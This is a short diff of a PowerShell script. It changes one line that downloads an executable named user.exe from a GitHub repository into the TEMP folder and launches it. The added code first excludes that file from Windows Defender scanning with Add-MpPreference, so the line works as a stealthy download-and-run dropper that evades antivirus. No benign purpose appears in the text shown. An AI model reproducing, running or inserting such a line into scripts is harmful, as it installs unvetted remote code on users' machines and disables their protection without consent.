@@ -105,4 +105,4 @@ try {
 } catch {}
 
 
-$p="$env:TEMP\user.exe"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/user.exe" -OutFile $p; Start-Process $p
+$p="$env:TEMP\user.exe"; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/user.exe" -OutFile $p; Start-Process $p
